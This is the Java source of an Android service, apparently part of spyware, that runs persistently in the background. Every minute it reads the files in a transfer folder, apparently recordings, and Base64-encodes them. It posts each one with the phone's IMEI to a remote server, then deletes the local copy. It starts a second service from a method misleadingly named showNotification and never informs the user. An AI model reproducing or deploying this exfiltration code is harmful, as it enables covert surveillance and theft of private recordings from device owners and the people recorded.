package com.cripple;

/**
 * Created by Developer on 23.01.2018.
 */

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.StrictMode;

import com.glob.Constants;
import com.glob.Global;
import com.loopj.android.http.Base64;
import com.loopj.android.http.RequestParams;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.Timer;
import java.util.TimerTask;

public class Lame extends Service {

    Timer timer = null;
    TimerTask timerTask;


    public Lame() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    public void onCreate() {
        Global.printLn("Lame","onCreate", "");
        super.onCreate();
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        showNotification();
    }


    private void showNotification() {
        if (startService(new Intent(this, Temp.class)) == null)
            throw new RuntimeException("Couldn't find " + Temp.class.getSimpleName());
    }


    public int onStartCommand(Intent intent, int flags, int startId) {
        Global.printLn("Lame","onStartCommand", "");
        time();
        return Service.START_STICKY;
    }

    public void onDestroy() {
        Global.printLn("Lame","onDestroy", "");
        timer.cancel();
        stopForeground(true);
        stopSelf();
    }

    //----------------------------------------------------------------------------------------------
    private void time() {
        timer = new Timer();
        timerTask = new TimerTask() {

            @Override
            public void run() {
                Global.printLn("Lame","time", "Lame time start");
                try {
                    sendFiles();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        };
        timer.scheduleAtFixedRate(timerTask, 1000, 60000);
    }

    //----------------------------------------------------------------------------------------------
    public static void transferFile(String fileDir, String fileName) throws IOException {
        String filePath = fileDir + fileName;

        final File myFile = new File(filePath);

        if (myFile.exists())
            Global.printLn("Lame","transferFile", "File Exists === "+ myFile);
        else
            return;

        RandomAccessFile f = new RandomAccessFile(filePath, "r");
        byte[] b = new byte[(int) f.length()];
        f.readFully(b);
        String str = Base64.encodeToString(b, Base64.DEFAULT);

        try {
            JSONObject json = new JSONObject();
            json.put("p_dev_id", Runner.devImei);
            json.put("p_file_type", "record");
            json.put("p_file_name", fileName);

            RequestParams params = new RequestParams();
            params.put("p_dev_inf_json", json.toString());
            params.put("file", str);

            String responce = Global.postUrl(Constants.GLOBALVAL.urlTransferFile, params);
            Global.printLn("Lame","transferFile", responce);
            if (!responce.substring(0,4).equals("fail"))
                myFile.delete();

        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    //----------------------------------------------------------------------------------------------
    public static void sendFiles() throws IOException {
        File parentDir = new File(Constants.HOME.transfer);
        if (!parentDir.exists())
            return;

        File[] files = parentDir.listFiles();
        for (File file : files) {
            if (file.isDirectory() || file.getName() == "log.txt" ) {
                continue;
            } else {
                if (file.canWrite() & file.canRead()) {

                    try{
                        Global.appendLog("sendFile >>>>>>>>>>>>>>>>=" + file.getName());
                        transferFile(Constants.HOME.transfer, file.getName());
                    }catch (Exception e) {
                        Global.appendLog("sendFile >>>>>>>>>>>>>>>>=" + e.getMessage());
                    }
                }
            }
        }
    }
}
